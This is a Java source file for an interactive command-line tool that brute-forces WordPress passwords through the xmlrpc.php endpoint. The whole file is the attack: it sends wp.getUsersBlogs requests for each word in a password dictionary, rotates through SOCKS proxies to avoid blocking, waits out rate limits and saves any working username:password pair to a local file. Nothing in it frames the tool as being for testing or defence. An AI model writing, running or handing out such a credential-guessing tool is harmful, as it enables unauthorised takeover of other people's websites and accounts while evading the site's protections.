package eu.indst.developer;

import javax.net.ssl.SSLHandshakeException;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.NoSuchElementException;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

import static java.lang.System.exit;

class Main{
    public static void main(String args[]) throws IOException {

        boolean found = false;
        boolean success = true;
        int delay = -1;
        String password = null;
        boolean useProxy = false;
        String answer = null;

        String website = null;
        String username = null;
        File passwords = null;

        while (website == null) {
            Scanner ScanInt = new Scanner(System.in);
            System.out.println("Insert the Wordpress website's XML-RPC URL to be attacked.");
            website = ScanInt.nextLine();

            // Debug
            System.out.println(website);
        }

            Scanner ScanLN = new Scanner(System.in);
            System.out.println("Do you want to attack the website using the SOCKS 4/5 proxy list? (Y/n)");
            answer = ScanLN.nextLine();

            // Debug
            System.out.println(answer);

            if ( !(answer.equals("Y")) && !(answer.equals("y")) && !(answer.equals("N")) && !(answer.equals("n")) && !(answer.equals("")) ) {
                System.out.println("Incorrect selection.");
                exit(0);
            } else if (answer.equals("Y") || answer.equals("y") || answer.equals("")) {
                useProxy = true;
            } else {
                useProxy = false;
            }

        while (passwords == null) {
            Scanner Scan = new Scanner(System.in);
            System.out.println("Insert a file to be used as password dictionary.");
            passwords = new File(Scan.nextLine());

            // Debug
            System.out.println(passwords);
        }

        while (username == null) {
            Scanner ScanInt = new Scanner(System.in);
            System.out.println("Insert a username to be for the wordpress attack.");
            username = ScanInt.nextLine();

            // Debug
            System.out.println(username);
        }

        while (delay == -1) {
            Scanner ScanDelay = new Scanner(System.in);
            System.out.println("Insert a Delay in seconds to be used when Rate Limited.");
            delay = ScanDelay.nextInt();

            // Debug
            System.out.println(delay);

            if (delay < 0) {
                System.out.println("The delay has to be higher than or equal to 0.");
                exit(0);
            }
        }

        try {

            if (useProxy == true) {
                File yourFile = new File("Proxies");
                yourFile.createNewFile();

                if (yourFile.length() == 0) {
                    System.out.println("No SOCKS proxies loaded in \"Proxies\" file.");
                    exit(0);
                }
            }

            //define input
            FileInputStream inputStream = null;
            Scanner sc = null;
            try {
                //input file

                inputStream = new FileInputStream(passwords);
                System.out.println("Loading the Dictionary...");


                sc = new Scanner(inputStream, "UTF-8");
                FileInputStream prx = null;
                Scanner fc = null;
                if (useProxy == true) {
                    prx = new FileInputStream("Proxies");
                    fc = new Scanner(prx, "UTF-8");

                }
                
                    String line = sc.nextLine();
                    

                //loop till no more lines and leaked found

                if (useProxy == true) {
                    System.out.println("Loading the Proxies...");
                }

                while (sc.hasNextLine() && found == false) {
                    
                    if (success == true) {
                        line = sc.nextLine();
                    } else {
                        success = true;
                    }
                    line = line.replaceAll("[^\\x20-\\x7e]", "");

                    Proxy proxy = null;
                    
                    if (useProxy == true) {
                        String full = null;
                        try {
                            full = fc.nextLine();
                        } catch (NoSuchElementException Excpt) {
                            fc.reset();
                            fc.close();
                            prx.close();
                            prx = new FileInputStream("Proxies");
                            fc = new Scanner(prx, "UTF-8");
                            full = fc.nextLine();
                        }
                        SocketAddress sockAddr = new InetSocketAddress(full.substring(0, full.indexOf(':')), Integer.parseInt(full.substring(full.indexOf(':') + 1)));
                        proxy = new Proxy(Proxy.Type.SOCKS, sockAddr);

                    }
                    
                    try {
                        if ((!line.isBlank()) && !(line == null) && (!line.isEmpty()) && !(line.equals("")) && !(line.equals(" "))) {

                            URL url = new URL(website);
                            HttpURLConnection http;
                            if (useProxy == true) {
                                http = (HttpURLConnection) url.openConnection(proxy);
                            } else {
                                http = (HttpURLConnection) url.openConnection();
                            }
                            http.setConnectTimeout(7000);
                            http.setReadTimeout(7000);
                            http.setRequestMethod("POST");
                            http.setDoOutput(true);
                            http.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                            String data = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + username + "</value></param><param><value>" + line + "</value></param></params></methodCall>";

                            byte[] out = data.getBytes(StandardCharsets.UTF_8);

                            OutputStream stream = http.getOutputStream();
                            stream.write(out);

                            BufferedReader br = null;
                            if (100 <= http.getResponseCode() && http.getResponseCode() <= 399) {
                                br = new BufferedReader(new InputStreamReader(http.getInputStream()));
                            } else {
                                br = new BufferedReader(new InputStreamReader(http.getErrorStream()));
                            }

                            String s = null;

                            while ((br.readLine()) != null) {
                                s = s + br.readLine();

                            }

                            if (s.contains("<value><int>403</int></value>")) {
                                System.out.println(username + " and " + line + " incorrect.");
                            } else if ((!s.contains("<value><int>403</int></value>")) && (s.contains("<name>isAdmin</name>"))) {
                                System.out.println(username + " and " + line + " correct.");
                                password = line;
                                System.out.println("Password equals " + line);

                                Writer output;
                                output = new BufferedWriter(new FileWriter("LoginDetails", true));  //clears file every time
                                output.append(username + ":" + password);
                                output.close();
                            } else if (s == null || s.isEmpty() || s.isBlank() || s.equals("nullnull")) {
                                System.out.println("Rate limited... Waiting " + delay + " seconds.");
                                TimeUnit.SECONDS.sleep(delay);
                            } else {
                                System.out.println("An exception occurred, check the URL for any error. Full website answer:");
                                System.out.println(s);
                                break;
                            }

                            //if (password.equals(line)) {
                            //found = true;
                            //password = line;
                            //}
                        }
                    } catch (SSLHandshakeException SSL) {
                        System.out.println("Proxy not working.");
                        success = false;
                    } catch (SocketException Socket) {
                        System.out.println("Proxy not working.");
                        success = false;
                    } catch (SocketTimeoutException Socket) {
                        System.out.println("Proxy not working.");
                        success = false;
                    }

                }

                if (sc.ioException() != null) {
                    throw sc.ioException();
                }
                //close stream
            } catch (InterruptedException e) {
                e.printStackTrace();
            } finally {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (sc != null) {
                    sc.close();
                }
            }

            System.out.println("Done...");

        } catch(FileNotFoundException err) {
            System.out.println("File Not Found.");
        } catch(MalformedURLException proto) {
            System.out.println("You need to specify a valid URL. Eg.'http://www.myURL.com/xmlrpc.php'");
        }
    }

}

